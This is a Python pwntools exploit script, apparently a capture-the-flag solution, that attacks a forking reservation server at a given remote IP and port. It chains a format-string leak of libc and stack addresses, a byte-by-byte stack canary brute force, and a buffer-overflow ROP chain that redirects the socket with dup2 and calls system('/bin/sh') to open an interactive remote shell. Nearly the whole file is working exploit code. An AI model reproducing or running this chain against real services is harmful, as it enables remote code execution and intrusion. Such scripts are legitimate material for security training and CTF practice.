#!/usr/bin/env python3

from pwn import *
from time import sleep
from re import match

exe = ELF("./server_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = remote("127.0.0.1", 1337)
    else:
        r = remote("94.237.53.134", 45490)

    return r


def reserve_table(r, data: bytes):
    r.sendlineafter(b"=> ", b"1")
    r.sendafter(b"=> ", data)


def place_order(r, data: bytes, extend_input: bool = True):
    r.sendlineafter(b"=> ", b"2")
    r.sendafter(b"=> ", data[:256])
    r.sendlineafter(b"=> ", b"y" if extend_input else b"n")
    if extend_input:
        r.sendafter(b"=> ", data[256:])


def print_reservations(r, lines: int) -> bytes:
    r.sendlineafter(b"=> ", b"5")
    return r.recvlines(lines)


def clear_reservations(r):
    r.sendlineafter(b"=> ", b"6")


def main():
    if args.LOCAL:
        server = process([exe.path])
        if args.GDB:
            gdb.attach(server, "set follow-fork-mode child")

    r1, r2, r3 = conn(), conn(), conn()

    libc.sym["pop_rdi"] = 0x02a3e5
    libc.sym["pop_rsi"] = 0x141d5e

    # Set "is_not_manager" from 1 to 0
    r1.sendafter(b"=> ", b"A" * 0x10)
    r2.sendafter(b"=> ", b"A" * 0x10)
    r3.sendafter(b"=> ", b"A" * 0x10)

    # Clear reservation.txt just in case
    clear_reservations(r1)

    sleep(0.5)  # Give some time to clear the file

    reserve_table(r2, b"%2$p")      # Leak of __lseek64+11
    reserve_table(r3, b"%9$p")      # Stack leak (not needed)

    sleep(0.5)  # Give some time to write to file

    leaks = print_reservations(r1, 2)
    libc.address = int(match(rb"Table for 0x(.+)", leaks[0]).group(1), 16) - (libc.sym.__lseek64 + 11)
    stack = int(match(rb"Table for 0x(.+)", leaks[1]).group(1), 16)
    log.info(f"libc: 0x{libc.address:x}")
    log.info(f"stack: 0x{stack:x}")

    r2.close()
    r3.close()

    # canary = int(input("Give canary in hex: "), 16)
    # Get canary by abusing the fork (in LOCAL this thing is stopped after a few minutes)
    # and on docker the function is not the one observed while debugging, but on REMOTE it works...
    canary = b"\x00"
    p = log.progress('Bruteforcing canary')
    context.log_level = 'error'
    for idx in range(0, 7):
        for b in range(256):
            r2 = conn()
            r2.sendafter(b"=> ", b"A" * 0x10)
            reserve_table(r2, b"A" * 4)
            place_order(r2, b"A" * 0x108 + canary + p8(b))
            
            try:
                r2.recvuntil(b"You order has been placed!\n")
                r2.recvline()        # This could trigger EOF. If not, the canary's byte was correct
                canary += p8(b)
                r2.close()
                break
            except EOFError:
                r2.close()
                continue

    context.log_level = 'info'
    p.success(f"0x{canary.hex()}")

    # ret2system and enjoy the shell!
    payload = flat(
        b"A" * 0x108,
        canary,
        b"B" * 8,

        # Redirect stdin and stdout to socket to make shell interactive through conenction
        libc.sym["pop_rdi"],
        0x4,    # socket fd is usually the lowest available, so in this case 4
        libc.sym["pop_rsi"],
        0x1,
        libc.sym.dup2,
        libc.sym["pop_rdi"],
        0x4,
        libc.sym["pop_rsi"],
        0x0,
        libc.sym.dup2,

        # Then spawn a shell
        libc.sym["pop_rdi"],
        libc.search(b"/bin/sh\x00").__next__(),
        libc.sym["pop_rdi"] + 1,
        libc.sym.system,

        # Exit (just a fancy way to use all the space in the overflow :D)
        libc.sym["pop_rdi"],
        0x0,
        libc.sym.exit
    )

    reserve_table(r1, b"AAAA")
    place_order(r1, payload)
    r1.interactive("$ ")


if __name__ == "__main__":
    main()
